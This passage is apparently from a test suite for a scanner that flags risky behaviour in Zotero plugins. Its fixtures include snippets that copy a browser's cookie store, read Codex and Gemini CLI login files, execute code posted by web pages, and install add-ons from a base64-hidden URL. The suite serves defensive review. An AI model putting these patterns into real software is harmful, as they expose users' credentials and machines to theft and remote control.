  it("follows handlers through route tables, loops and bound methods", async () => {
    const table = await scanFiles({
      "bootstrap.js": `async function ep_delete(body) { const item = await Zotero.Items.getAsync(body.id); await item.eraseTx(); }
        async function ep_search(body) { return []; }
        const ROUTES = [["/w/search", ["POST"], ep_search], ["/w/delete-items", ["POST"], ep_delete]];
        function makeEndpoint(fn, methods) { return function () { return { supportedMethods: methods, init: async (a) => fn(a) }; }; }
        function registerEndpoints() { for (const [path, methods, fn] of ROUTES) Zotero.Server.Endpoints[path] = makeEndpoint(fn, methods); }`,
    });
    expect(editsLibrary(table)).toBeDefined();
    const bound = await scanFiles({
      "content/bridge.js": `var Bridge = {
          startup() { this.register("/apply", ["POST"], this.apply.bind(this)); },
          register(suffix, methods, handler) { const E = function () {}; E.prototype = { supportedMethods: methods, init(data, cb) { handler(data).then((p) => cb(200, "application/json", JSON.stringify(p))); } };
            Zotero.Server.Endpoints[\`/b\${suffix}\`] = E; },
          async apply(data) { await Zotero.DB.executeTransaction(async () => { item.addTag(data.tag); await item.save(); }); return { ok: true }; },
        };`,
    });
    expect(editsLibrary(bound)).toBeDefined();
  });

  it("finds a helper in another file and the MCP tools an endpoint hands out", async () => {
    // zotero-ai-summary registers through a helper in lib/util.js.
    const helper = await scanFiles({
      "lib/util.js": `function registerEndpoint(path, handler) { Zotero.Server.Endpoints[path] = function () { return handler; }; }`,
      "lib/endpoints/create-note.js": `function registerCreateNote() { registerEndpoint("/s/note", { supportedMethods: ["POST"], supportedDataTypes: ["application/json"],
          init: async function (req) { const note = new Zotero.Item("note"); note.setNote(req.data.html); await note.saveTx(); return [200, "application/json", "{}"]; } }); }`,
    });
    expect(editsLibrary(helper)?.details?.endpoints).toEqual(["/s/note"]);
    const mcp = await scanFiles({
      "content/mcp.js": `const TOOLS = [{ name: "create_note", description: "Create a note", inputSchema: { type: "object" } }, { name: "search_items", description: "Search", inputSchema: {} }];
        function handleMcp(body) { if (body.method === "tools/call") return dispatch(body.params); }
        Zotero.Server.Endpoints["/m/mcp"] = class { supportedMethods = ["POST"]; supportedDataTypes = ["application/json"]; async init(req) { return [200, "application/json", JSON.stringify(await handleMcp(req.data))]; } };`,
    });
    expect(editsLibrary(mcp)).toBeDefined();
    // Read tools alone change nothing.
    const readOnly = await scanFiles({
      "content/mcp.js": `const TOOLS = [{ name: "find_import_collections", description: "Find", inputSchema: {} }];
        function handleMcp(body) { if (body.method === "tools/call") return dispatch(body.params); }
        Zotero.Server.Endpoints["/m/mcp"] = class { async init(req) { return [200, "application/json", "{}"]; } };`,
    });
    expect(editsLibrary(readOnly)).toBeUndefined();
  });

  it("rates an endpoint web pages can use to change the library as serious", async () => {
    const endpoint = (decl: string, init = "") =>
      scanFiles({
        "content/a.js": `const Import = function () {};
          Import.prototype = { ${decl}, allowRequestsFromUnsafeWebContent: true,
            async init(req) { ${init} const item = new Zotero.Item("journalArticle"); item.setField("title", req.data.title); await item.saveTx(); return [200, "text/plain", "ok"]; } };
          Zotero.Server.Endpoints["/x/import"] = Import;`,
      });
    const open = await endpoint(
      `supportedMethods: ["POST"], supportedDataTypes: ["application/json", "text/plain"]`,
    );
    expect(editsLibrary(open)?.details?.web).toBe("any");
    expect(open.card.capabilities).toContainEqual({ id: "server-edits-library", concern: "high" });
    expect(open.card.label).toBe("high-concern");
    // A JSON body needs a preflight Zotero refuses (zotarxiv).
    const json = await endpoint(
      `supportedMethods: ["POST"], supportedDataTypes: ["application/json"]`,
    );
    expect(editsLibrary(json)?.details?.web).toBeUndefined();
    // A form post arrives as flat strings, which a schema for a structured field rejects (zotero-syllabus).
    const form = await endpoint(
      `supportedMethods: ["POST"], supportedDataTypes: ["application/x-www-form-urlencoded", "application/json"]`,
      `const { metadata } = req.data; const valid = MetadataSchema.safeParse(metadata); if (!valid.success) return [400, "text/plain", "bad"];`,
    );
    expect(editsLibrary(form)?.details?.web).toBeUndefined();
    // A custom header needs a preflight too (zotero-gpt-literature-summary).
    const header = await endpoint(
      `supportedMethods: ["GET"]`,
      `const bridge = req.headers["x-bridge"]; if (bridge !== "1") return [403, "text/plain", "no"];`,
    );
    expect(editsLibrary(header)?.details?.web).toBeUndefined();
    // A random token the page can't know stops it (confucius, zotradar).
    const token = await scanFiles({
      "content/a.js": `const TOKEN = Zotero.Utilities.randomString(32);
        function E() {} E.prototype = { supportedMethods: ["POST"], allowRequestsFromUnsafeWebContent: true,
          async init(req) { if (req.data.token !== TOKEN) return [403, "text/plain", "no"]; await item.saveTx(); } };
        Zotero.Server.Endpoints["/x/import"] = E;`,
    });
    expect(editsLibrary(token)?.details?.web).toBeUndefined();
    expect(token.card.capabilities).toContainEqual({ id: "server-edits-library", concern: "low" });
  });

  it("follows a patch to Zotero's request handling that opens endpoints to web pages", async () => {
    // zotero-ai-summary: answers the preflight for its own paths, for any site.
    const own = await scanFiles({
      "lib/util.js": `var CORS = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type, Zotero-Allowed-Request" };
        function patchServer() { let proto = Zotero.Server.RequestHandler.prototype; proto._orig = proto.handleRequest;
          proto.handleRequest = async function () { if (!this.request.path.startsWith("/s/")) return proto._orig.call(this);
            if (this.request.method === "OPTIONS") { this._requestFinished(this._generateResponse(204, CORS, "")); return; } return proto._orig.call(this); }; }
        function registerEndpoint(path, handler) { Zotero.Server.Endpoints[path] = function () { return handler; }; }
        registerEndpoint("/s/note", { supportedMethods: ["POST"], supportedDataTypes: ["application/json"], init: async (req) => { const n = new Zotero.Item("note"); await n.saveTx(); } });`,
    });
    expect(editsLibrary(own)?.details?.web).toBe("any");
    expect(own.card.label).toBe("high-concern");
    // reference-map: every endpoint on the server, for the websites the user approves in a prompt.
    const patch = (body: string) =>
      scanFiles({
        "bootstrap.js": `function corsHeaders(handler, origin) { return "Access-Control-Allow-Origin: " + origin + " Access-Control-Allow-Headers: " + handler.headers["access-control-request-headers"]; }
          function askFor(origin) { if (Services.prompt.confirmEx(null, "Connect", origin, 0, "Allow", "Deny", null, null, {}) === 0) save(origin); }
          function startup() { const proto = Zotero.Server && Zotero.Server.RequestHandler && Zotero.Server.RequestHandler.prototype; const orig = proto._generateResponse;
            proto._generateResponse = function (status, type, body) { let out = orig.call(this, status, type, body); ${body} return out; }; }`,
      });
    const approved = await patch(
      `if (allowed().has(this.origin)) out = out + corsHeaders(this, this.origin); else askFor(this.origin);`,
    );
    expect(approved.card.capabilities).toContainEqual({
      id: "local-http-server",
      concern: "medium",
    });
    expect(approved.card.label).toBe("review-details");
    const anySite = await patch(`out = out + corsHeaders(this, this.origin);`);
    expect(anySite.card.capabilities).toContainEqual({ id: "local-http-server", concern: "high" });
  });

  it("names a setting, off by default, that an endpoint waits for, and counts it a step lower", async () => {
    // cite-non-english: the caller returns early while the setting is off.
    const r = await scanFiles({
      "prefs.js": `pref("extensions.cne.agentEnabled", false);`,
      "content/cne.js": `function registerEndpoints(server) { server.Endpoints["/cne/v1"] = class { async init(req) { await item.saveTx(); } }; }
        function syncAgentAccess() { if (!getPref("agentEnabled")) return; const server = Zotero.Server; registerEndpoints(server); }`,
    });
    expect(editsLibrary(r)?.details?.setting).toBe("agentEnabled");
    expect(r.card.capabilities).toContainEqual({ id: "server-edits-library", concern: "none" });
    // doi2pdf: one of Zotero's local API classes, which answers only while the local API is on.
    const localApi = await scanFiles({
      "content/a.js": `Zotero.Server.LocalAPI.AddDOIEndpoint = class extends Zotero.Server.LocalAPI.Schema {
          supportedMethods = ["POST"]; async run(req) { await collection.saveTx(); return [200, "text/plain", "ok"]; } };
        Zotero.Server.Endpoints["/api/plus/add-doi"] = Zotero.Server.LocalAPI.AddDOIEndpoint;`,
    });
    expect(editsLibrary(localApi)?.details?.setting).toBe("httpServer.localAPI.enabled");
    // beaver-zotero: a setting held in a name the caller checks, and a condition that is never
    // true, which leaves the other registration dead.
    const held = await scanFiles({
      "prefs.js": `pref("extensions.zotero.x.mcpServerEnabled", false);`,
      "content/a.js": `function registerEndpoint(path, endpoint) { const E = function () {}; E.prototype = endpoint; Zotero.Server.Endpoints[path] = E; }
        function registerMcpServer() { return registerEndpoint("/x/mcp", { async init(req) { await note.saveTx(); } }); }
        function registerEndpoints() { return registerEndpoint("/x/delete", { async init(req) { await item.eraseTx(); } }); }
        function reconcile(snapshot) {
          const httpEnabled = !!snapshot.session && false;
          if (httpEnabled && !this.http) this.http = registerEndpoints();
          const mcpKey = getPref("mcpServerEnabled") ? "on" : "";
          if (mcpKey) this.mcp = registerMcpServer();
        }`,
    });
    expect(editsLibrary(held)?.details).toMatchObject({
      setting: "mcpServerEnabled",
      endpoints: ["/x/mcp"],
    });
  });

  it("rates code sent by web pages above code sent by other programs", async () => {
    const r = await scanFiles({
      "bootstrap.js": `function E() {} E.prototype = { supportedMethods: ["POST"], supportedDataTypes: ["text/plain"], allowRequestsFromUnsafeWebContent: true,
          async init(req) { const code = String(req.data); const fn = new AsyncFunction("Zotero", code); return [200, "text/plain", String(await fn(Zotero))]; } };
        Zotero.Server.Endpoints["/x/exec"] = E;`,
    });
    expect(capIn(r, "runs-sent-code")?.details?.apis).toContain("web pages");
    expect(r.card.capabilities).toContainEqual({ id: "runs-sent-code", concern: "high" });
  });

  it("says when it turns Zotero's server back on (zotero-prism)", async () => {
    const r = await scanFiles({
      "content/a.js": `Zotero.Prefs.get("httpServer.enabled") || Zotero.Prefs.set("httpServer.enabled", !0);`,
    });
    // A settings change since C33; the local API keeps its own badge.
    expect(capIn(r, "changes-settings")?.details?.settings).toEqual([
      { change: "server", asks: "click" },
    ]);
    expect(capIn(r, "enables-local-api")).toBeUndefined();
  });
});

describe("using other apps' logins (C40)", () => {
  it("flags copying a browser's cookie store, naming the browser", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const userData = homeDir + "/Microsoft/Edge/User Data";
        copyFile(userData + "/Default/Network/Cookies", dst);`,
    });
    expect(capIn(r, "browser-credentials")?.details?.apis).toEqual(["Microsoft Edge"]);
    expect(r.card.capabilities).toContainEqual({ id: "browser-credentials", concern: "high" });
  });

  it("flags Firefox's own cookie file, without a browser name on the path", async () => {
    const r = await scanFiles({
      "content/a.js": `const c = await IOUtils.read(PathUtils.join(profile, "cookies.sqlite"));`,
    });
    expect(capIn(r, "browser-credentials")?.details?.apis).toEqual(["Firefox"]);
  });

  it("doesn't take a bare Cookies keyword or a store path shown in help for a store read", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const keywords = ["Cookies", "CookieStore", "Web Data Mining"];
        showHint("Your cookies live at ~/Library/Cookies/Cookies.binarycookies");`,
    });
    expect(capIn(r, "browser-credentials")).toBeUndefined();
  });

  it("flags reading another program's saved sign-in, naming each program", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const p = joinPath(homeDir(), ".codex", "auth.json");
        const auth = JSON.parse(await Zotero.File.getContentsAsync(p));
        const g = joinPath(homeDir(), ".gemini", "oauth_creds.json");
        const gc = JSON.parse(await Zotero.File.getContentsAsync(g));`,
    });
    expect(capIn(r, "reused-app-login")?.details?.apis).toEqual(["Codex CLI", "Gemini CLI"]);
    expect(r.card.capabilities).toContainEqual({ id: "reused-app-login", concern: "medium" });
  });

  it("resolves $CODEX_HOME/auth.json to the Codex login", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const home = Services.env.get("CODEX_HOME");
        await Zotero.File.getContentsAsync(joinPath(home, "auth.json"));`,
    });
    expect(capIn(r, "reused-app-login")?.details?.apis).toEqual(["Codex CLI"]);
  });

  it("ignores a login path in help text and non-credential config files", async () => {
    const help = await scanFiles({
      "content/a.js": `showMessage("codex auth reuses local credentials from ~/.codex/auth.json");`,
    });
    expect(capIn(help, "reused-app-login")).toBeUndefined();
    const config = await scanFiles({
      "content/a.js": `
        await Zotero.File.getContentsAsync(joinPath(home, ".codex", "config.toml"));
        await Zotero.File.getContentsAsync(joinPath(home, ".gemini", "settings.json"));`,
    });
    expect(capIn(config, "reused-app-login")).toBeUndefined();
  });
});

describe("where add-ons it installs come from (C44)", () => {
  const installs = (r: ScanOutput, id = "installs-addons") => capIn(r, id)?.details?.installs;
  const feed = {
    update_url: "https://github.com/fixture/plugin/releases/download/release/update.json",
  };

  it("names a market's catalogue and the mirror its files come through (garden-for-zotero)", async () => {
    const r = await scanFiles({
      "content/app.js": `const XPI_BASE_URL = "https://ftp.zotero-chinese.com/addons/";
        class Api { constructor() { this.baseUrl = "https://soil.fixture-dev.top"; }
          downloadUrl(id) { return \`\${this.baseUrl}/v1/plugins/\${id}/download\`; }
          xpiUrl(path) { return \`\${XPI_BASE_URL}\${path}\`; } }
        async function installAddonFromUrl(url) { const install = await AddonManager.getInstallForURL(url); await install.install(); }
        async function installPlugin(id) { await installAddonFromUrl(plugins.get(id).downloadUrl); }`,
    });
    expect(installs(r)).toEqual([
      {
        from: "catalogue",
        hosts: ["soil.fixture-dev.top"],
        via: ["ftp.zotero-chinese.com"],
        asks: "click",
        hash: false,
      },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "installs-addons", concern: "medium" });
  });

  it("rates a silent self-update through GitHub proxies with no hash high (paper-chat)", async () => {
    const r = await scanFiles(
      {
        "content/a.js": `const GITHUB_PROXY_BASES = ["https://gh-proxy.org/", "https://ghfast.top/"];
          function candidates(url) { return [url, ...GITHUB_PROXY_BASES.map((b) => b + url)]; }
          async function installAddonFrom(url) { const install = await AddonManager.getInstallForURL(url); await install.install(); }
          async function installUpdate(update) { for (const u of candidates(update.update_link)) await installAddonFrom(u); }
          async function runSelfUpdateCheck() { const update = await findAvailableUpdate(); if (update) await installUpdate(update); }
          function startSelfUpdateScheduler() { setInterval(() => void runSelfUpdateCheck(), 3 * 3600e3); return runSelfUpdateCheck(); }
          async function onStartup() { startSelfUpdateScheduler(); }`,
      },
      { manifest: feed },
    );
    expect(installs(r, "self-installs")).toEqual([
      {
        from: "feed",
        hosts: ["github.com"],
        via: ["gh-proxy.org", "ghfast.top"],
        asks: "none",
        auto: true,
        hash: false,
      },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "self-installs", concern: "high" });
  });

  it("keeps a silent self-update from its own https feed, checked by hash, at medium (jaeyoonsung)", async () => {
    const r = await scanFiles(
      {
        "content/updater.js": `function create({ install }) {
            async function run() { const entry = await check(); if (!/^https:\\/\\//i.test(entry.update_link)) return; await install(entry); }
            const tick = () => { run().then(() => setTimeout(tick, DAY)); };
            return { start() { setTimeout(tick, 45000); } }; }`,
        "content/runtime.js": `const updater = create({ install: (entry) => installAddon(entry) });
          async function installAddon(entry) { const install = await AddonManager.getInstallForURL(entry.update_link, { hash: entry.update_hash }); install.install(); }`,
      },
      { manifest: feed },
    );
    expect(installs(r, "self-installs")).toEqual([
      { from: "feed", hosts: ["github.com"], asks: "none", auto: true, hash: true, https: true },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "self-installs", concern: "medium" });
  });

  it("rates its own update checked against a hash after a click low, through its helpers (confucius)", async () => {
    const r = await scanFiles(
      {
        "content/a.js": `class UpdateService { async install() { return installRelease(this.latest); } }
          const tools = { async prepare(name) { return name.trim(); } };
          const runtime = {
            async download(url) { return (await Zotero.HTTP.request("GET", url, { responseType: "arraybuffer" })).response; },
            digest: (path) => IOUtils.computeHexDigest(path, "sha256"),
            async prepare(path) { return AddonManager.getInstallForFile(Zotero.File.pathToFile(path)); },
          };
          async function installRelease(release, rt = runtime) {
            const path = await save(await rt.download(release.url));
            if (\`sha256:\${await rt.digest(path)}\` !== release.digest) throw new Error("checksum");
            const install = await rt.prepare(path); install.install();
          }`,
      },
      { manifest: feed },
    );
    expect(installs(r, "self-installs")).toEqual([
      { from: "feed", hosts: ["github.com"], asks: "click", hash: true },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "self-installs", concern: "low" });
  });

  it("rates restoring a backup the user picks, or add-on files in their library, low (tara, settings-sync)", async () => {
    const backup = await scanFiles({
      "content/a.js": `async function restoreFromFile(zipPath) { await unzipToTemporaryDir(zipPath, tmpDir);
          for (const a of backupPrefs.addons) { const install = await AddonManager.getInstallForFile(Zotero.File.pathToFile(PathUtils.join(tmpDir, "extensions", a.id + ".xpi"))); await install.install(); } }
        async function importFromBackup() { const path = await new FilePickerHelper("Import", "open", [["Zip", "*.zip"]]).open(); await restoreFromFile(path); }`,
    });
    expect(installs(backup)).toEqual([{ from: "backup", asks: "click" }]);
    expect(backup.card.capabilities).toContainEqual({ id: "installs-addons", concern: "low" });
    const library = await scanFiles({
      "content/a.js": `async function applyPluginsFromCloud(collection) { for (const id of collection.getChildItems(true)) {
          const item = Zotero.Items.get(id);
          if (item.isAttachment() && item.attachmentFilename.endsWith(".xpi")) { const file = Zotero.File.pathToFile(await item.getFilePathAsync()); const install = await AM.getInstallForFile(file); await install.install(); } } }`,
    });
    expect(installs(library)).toEqual([{ from: "library", asks: "click" }]);
  });

  it("reads a market's confirm dialogs, its off-by-default auto-update and a link that switches its catalogue (zotero-addons)", async () => {
    const r = await scanFiles({
      "content/a.js": `var Sources = [{ id: "github", api: "https://raw.githubusercontent.com/fixture/scraper/publish/addon_infos.json" },
          { id: "ghproxy", api: "https://gh-proxy.org/https://raw.githubusercontent.com/fixture/scraper/publish/addon_infos.json" }];
        async function installAddonFrom(url) { const install = await getAddonManager().getInstallForURL(url); await install.install(); }
        function setCustomSourceApi(api) { setPref("customSource", api); }
        class TableActions {
          static async installAddon(a) { await installAddonFrom(a.xpiUrl); }
          static async installAddons(addons) { for (const a of addons) await installAddonFrom(a.xpiUrl); }
          static async updateExistAddons() { await TableActions.installAddons(await outdated()); } }
        async function handleInstall(params) { const url = decodeURIComponent(params.source);
          if (Services.prompt.confirmEx(null, "Install", url, 0, "Install", "", "", "", {}) === 0) installAddonFrom(url); }
        async function handleConfigSource(params) { setCurrentSource("source-custom"); setCustomSourceApi(decodeURIComponent(params.customURL)); }
        const ext = { noContent: true, doAction: async (uri) => { const params = parse(uri.spec);
            if (params.action === "install") await handleInstall(params); else await handleConfigSource(params); },
          newChannel(uri) { this.doAction(uri); } };
        Services.io.getProtocolHandler("zotero").wrappedJSObject._extensions["zotero://fixturemarket"] = ext;
        async function onStartup() { if (getPref("autoUpdate")) TableActions.updateExistAddons(); }`,
    });
    const catalogue = {
      from: "catalogue",
      hosts: ["raw.githubusercontent.com"],
      via: ["gh-proxy.org"],
      hash: false,
    };
    expect(installs(r)).toEqual(
      expect.arrayContaining([
        { ...catalogue, asks: "click" },
        { ...catalogue, asks: "none", auto: true, setting: "autoUpdate" },
        { from: "link", asks: "confirm" },
        { from: "link-source", asks: "none" },
      ]),
    );
    expect(r.card.capabilities).toContainEqual({ id: "installs-addons", concern: "high" });
  });

  it("rates an install an AI tool asks for behind an off-by-default setting a step lower (zotero-agent)", async () => {
    const r = await scanFiles({
      "content/a.js": `async function installPluginFromUrl(url) { if (!/^(https?|file):\\/\\//i.test(url)) throw new Error("bad url");
          const install = await AddonManager.getInstallForURL(url); await install.install(); }
        async function handleToolCall(name, args) { switch (name) {
          case "install_plugin_from_url": { const on = Zotero.Prefs.get("extensions.zotero.agent.eval.enabled", true);
            if (on !== true) throw new Error("Dev tools are disabled"); return installPluginFromUrl(args.url); } } }
        function handle(body) { if (body.method === "tools/call") return handleToolCall(body.params.name, body.params.arguments); }`,
    });
    expect(installs(r)).toEqual([
      { from: "message", asks: "none", setting: "extensions.zotero.agent.eval.enabled" },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "installs-addons", concern: "medium" });
  });

  it("reads a file name off a web page, and a click on a button not about installing as unasked (zotero-gpt)", async () => {
    const r = await scanFiles({
      "content/a.js": `t.querySelector("#api-store").addEventListener("click", async () => {
          const j = "https://ftp.zotero-chinese.com/addons/Garden-for-Zotero/"; const H = await fetch(j);
          const found = [...(await H.text()).matchAll(/v(\\d+)\\.(\\d+)\\.(\\d+)\\.xpi/g)];
          const Le = j + found[0][0]; await (await AddonManager.getInstallForURL(Le)).install(); });
        async function showDialog() { if (!Zotero.ActionsTags) window.confirm("Install Actions and Tags?") &&
          await (await AddonManager.getInstallForURL("https://gitee.com/fixture/plugins/raw/xpi/1.xpi")).install(); }`,
    });
    expect(installs(r)).toEqual([
      { from: "fixed", hosts: ["gitee.com"], asks: "confirm", hash: false, https: true },
      { from: "page", hosts: ["ftp.zotero-chinese.com"], asks: "none", hash: false, https: true },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "installs-addons", concern: "high" });
  });

  it("rates reinstalling itself from an address hidden in base64 high (zotero-style)", async () => {
    const r = await scanFiles(
      {
        "content/a.js": `const _0x134cd0 = window.atob; const reinstall = async () => { addon.disable();
          await (await AddonManager.getInstallForURL(_0x134cd0("aHR0cHM6Ly9naXRlZS5jb20vRml4dHVyZS9wbHVnaW5zL3Jhdy9tYXN0ZXIvZml4dHVyZS54cGk="))).install(); };`,
      },
      { manifest: { update_url: "https://gitee.com/Fixture/plugins/raw/master/update.json" } },
    );
    expect(installs(r, "self-installs")).toEqual([
      { from: "hidden", hosts: ["gitee.com"], asks: "click", hash: false, https: true },
    ]);
    expect(r.card.capabilities).toContainEqual({ id: "self-installs", concern: "high" });
  });

  it("notes turning Zotero's automatic updates on for itself at startup (literature-review-with-llm)", async () => {
    const r = await scanFiles(
      {
        "bootstrap.js": `async function startup({ id }) { pluginID = id; await applyPolicy(); }
          async function applyPolicy() { await setAutoUpdate(true, { addonId: pluginID }); }`,
        "content/auto-update.js": `async function setAutoUpdate(enabled, options) { const addon = await AddonManager.getAddonByID(options.addonId);
            addon.applyBackgroundUpdates = autoUpdateMode(enabled, AddonManager); }
          function autoUpdateMode(enabled, manager) { if (enabled) return manager.AUTOUPDATE_ENABLE; return manager.AUTOUPDATE_DISABLE; }`,
      },
      { manifest: feed },
    );
    expect(capIn(r, "self-update")?.details?.apis).toEqual([FORCES_AUTO_UPDATE]);
    expect(r.card.label).toBe("low-concern");
    // Only when it runs by itself: a settings button that does it is the user's choice.
    const button = await scanFiles(
      {
        "content/a.js": `btn.addEventListener("command", async () => { const addon = await AddonManager.getAddonByID(id);
          addon.applyBackgroundUpdates = AddonManager.AUTOUPDATE_ENABLE; });`,
      },
      { manifest: feed },
    );
    expect(capIn(button, "self-update")?.details?.apis).toBeUndefined();
  });
});

describe("settings that aren't its own (C33)", () => {
  const settings = (r: ScanOutput) => capIn(r, "changes-settings")?.details?.settings;
  const concern = (r: ScanOutput) =>
    r.card.capabilities.find((c) => c.id === "changes-settings")?.concern;

  it("reads which of Zotero's settings a write lands on, and skips the plugin's own (epa, zotbox)", async () => {
    const r = await scanFiles({
      "content/a.js": `function useProxy(host) { Zotero.Prefs.set("network.proxy.type", 1, true); Zotero.Prefs.set("network.proxy.http", host, true); }
        function webdav(url) { Zotero.Prefs.set("sync.storage.url", url); }
        btn.addEventListener("command", () => { useProxy(input.value); webdav(field.value); });`,
    });
    expect(settings(r)).toEqual([
      { change: "proxy", asks: "click" },
      { change: "sync", asks: "click" },
    ]);
    expect(concern(r)).toBe("medium");
    // Names Zotero never reads (`extensions.zotero.API_URL`, a top-level `findPDFs.resolvers`),
    // its own settings, and Zotero's read but not written, change nothing.
    const none = await scanFiles({
      "content/a.js": `Zotero.Prefs.set("API_URL", "", null); Zotero.Prefs.set("findPDFs.resolvers", "[]", true);
        setPref("network.proxy.type", 1); Zotero.Prefs.set("extensions.fixture.proxy", "x", true);
        const type = Zotero.Prefs.get("network.proxy.type", true);`,
    });
    expect(capIn(none, "changes-settings")).toBeUndefined();
  });

  it("rates changes by what starts them, through minified hooks and setters (prism, scipdf)", async () => {
    const prism = await scanFiles({
      "content/a.js": `function gm(){Zotero.Prefs.get("httpServer.enabled")||Zotero.Prefs.set("httpServer.enabled",!0)}
        async function S7(){await Zotero.initializationPromise;gm()} var Ag={onStartup:S7};`,
    });
    expect(settings(prism)).toEqual([{ change: "server", asks: "none", auto: true }]);
    expect(concern(prism)).toBe("medium");
    const scipdf = await scanFiles({
      "content/a.js": `class Manager { static KEY = "extensions.zotero.findPDFs.resolvers";
          get resolvers() { return JSON.parse(Zotero.Prefs.get(Manager.KEY, true) || "[]"); }
          set resolvers(list) { Zotero.Prefs.set(Manager.KEY, JSON.stringify(list), true); }
          append(list) { this.resolvers = this.resolvers.concat(list); } }
        async function onStartup() { new Manager().append([{ name: "Sci-Hub", url: "https://sci-hub.example/{doi}" }]); }`,
    });
    expect(settings(scipdf)).toEqual([{ change: "find-pdf", asks: "none", auto: true }]);
  });

  it("tells a switch the user flips from one set for them (zotbox, zotlite, obsidian-linker)", async () => {
    // Zotero's updates turned off by a fixed value, and from a checkbox behind an obfuscator.
    const forced = await scanFiles({
      "content/a.js": `function onStartup() { Zotero.Prefs.set("app.update.auto", false, true); }`,
    });
    expect(concern(forced)).toBe("high");
    const checkbox = await scanFiles({
      "content/a.js": `box.addEventListener("command", () => { const on = box.checked; Zotero[d(0x814)][d(0x568)]("app.update.auto", !on, !![]); });`,
    });
    expect(settings(checkbox)).toEqual([{ change: "updates", asks: "click", optIn: true }]);
    expect(concern(checkbox)).toBe("medium");
    // Turning them back on isn't the change.
    const on = await scanFiles({
      "content/a.js": `Zotero.Prefs.set("app.update.auto", true, true);`,
    });
    expect(capIn(on, "changes-settings")).toBeUndefined();
    // Zotero's question before opening obsidian:// links: dropped for good on a click; behind an
    // off-by-default setting that returns early; in a fallback for a missing API.
    const zotlite = await scanFiles({
      "content/a.js": `btn.addEventListener("click", () => { Zotero.Prefs.set("network.protocol-handler.warn-external.obsidian", false, true); Zotero.launchURL(uri); });`,
    });
    expect(settings(zotlite)).toEqual([
      { change: "link-prompts", target: "obsidian", asks: "click" },
    ]);
    expect(concern(zotlite)).toBe("medium");
    const linker = await scanFiles({
      "prefs.js": `pref("extensions.zotero.linker.trustObsidianLinks", false);`,
      "content/a.js": `function applyTrust() { const prefs = Services.prefs;
          if (!this.getPref("trustObsidianLinks", false)) { prefs.clearUserPref("network.protocol-handler.warn-external.obsidian"); return; }
          prefs.setBoolPref("network.protocol-handler.warn-external.obsidian", false); }`,
    });
    expect(settings(linker)?.[0]).toMatchObject({ setting: "trustObsidianLinks", optIn: true });
    expect(concern(linker)).toBe("low");
    const fallback = await scanFiles({
      "content/a.js": `function open(url) { const info = svc.getProtocolHandlerInfoFromOS("obsidian", {});
          if (typeof info.launchWithURI === "function") { info.launchWithURI(uri, null); return; }
          Services.prefs.setBoolPref("network.protocol-handler.warn-external.obsidian", false); }`,
    });
    expect(capIn(fallback, "changes-settings")).toBeUndefined();
  });

  it("drops a value saved and put back in the same function, not a toggle's two branches (zutilo)", async () => {
    const swap = await scanFiles({
      "content/a.js": `function copyWith(format) { const orig = Zotero.Prefs.get("network.proxy.type", true);
          Zotero.Prefs.set("network.proxy.type", 0, true); doCopy(); Zotero.Prefs.set("network.proxy.type", orig, true); }`,
    });
    expect(capIn(swap, "changes-settings")).toBeUndefined();
    const toggle = await scanFiles({
      "content/a.js": `function applyProxy(on) { const saved = Zotero.Prefs.get("network.proxy.type", true);
          if (on) { Zotero.Prefs.set("network.proxy.type", 2, true); } else { Zotero.Prefs.set("network.proxy.type", saved, true); } }`,
    });
    expect(settings(toggle)).toEqual([{ change: "proxy", asks: "click" }]);
  });

  it("drops a value saved and put back from another function in the file, not one only read (multifetcher, proxy-gui)", async () => {
    const apply = `var KEYS = ["network.proxy.type", "network.proxy.socks"];
      function applyProxy(host) { const saved = new Map(); const prefs = Services.prefs;
        for (const key of KEYS) saved.set(key, prefs.getCharPref(key));
        prefs.setIntPref("network.proxy.type", 1); prefs.setCharPref("network.proxy.socks", host); return saved; }`;
    // A SOCKS proxy on for a fetch, the saved values written back afterwards (zotero-multifetcher).
    const snapshot = await scanFiles({
      "content/a.js": `${apply}
        function restoreProxy(saved) { for (const [key, value] of saved) Services.prefs.setCharPref(key, value); }
        async function fetchVia(host) { const saved = applyProxy(host); try { await fetch(url); } finally { restoreProxy(saved); } }`,
    });
    expect(capIn(snapshot, "changes-settings")).toBeUndefined();
    const kept = await scanFiles({
      "content/a.js": `class Tunnel { on() { this.old = Zotero.Prefs.get("network.proxy.type", true); Zotero.Prefs.set("network.proxy.type", 1, true); }
          off() { Zotero.Prefs.set("network.proxy.type", this.old, true); } }`,
    });
    expect(capIn(kept, "changes-settings")).toBeUndefined();
    // Saved but never written back; read elsewhere and never put back (zotero-proxy-gui).
    const unsaved = await scanFiles({ "content/a.js": apply });
    expect(settings(unsaved)).toEqual([{ change: "proxy", asks: "click" }]);
    const gui = await scanFiles({
      "content/a.js": `var ProxyManager = { apply(config) { Zotero.Prefs.set("network.proxy.type", 1, true); Zotero.Prefs.set("network.proxy.http", config.host, true); },
          status() { return Zotero.Prefs.get("network.proxy.type", true); } };
        btn.addEventListener("command", () => ProxyManager.apply(cfg));`,
    });
    expect(settings(gui)).toEqual([{ change: "proxy", asks: "click" }]);
  });

  it("counts another program's settings file only when a write goes to it, not a log beside it", async () => {
    const home = `function home() { return Services.dirsvc.get("Home", Ci.nsIFile).path; }
      const log = (m) => IOUtils.writeUTF8(PathUtils.join(PathUtils.profileDir, "setup.log"), m);`;
    const readRc = await scanFiles({
      "content/a.js": `${home}
        async function checkPath() { const rc = PathUtils.join(home(), ".zshrc"); const text = await IOUtils.readUTF8(rc);
          await IOUtils.writeUTF8(PathUtils.join(PathUtils.profileDir, "path.log"), String(text.includes("bin"))); }`,
    });
    expect(capIn(readRc, "changes-settings")).toBeUndefined();
    const readClaude = await scanFiles({
      "content/a.js": `${home}
        async function provider() { const p = PathUtils.join(home(), ".claude", "settings.json"); const s = JSON.parse(await IOUtils.readUTF8(p));
          await log(\`read \${p}\`); return s.env; }`,
    });
    expect(capIn(readClaude, "changes-settings")).toBeUndefined();
    const writeRc = await scanFiles({
      "content/a.js": `${home}
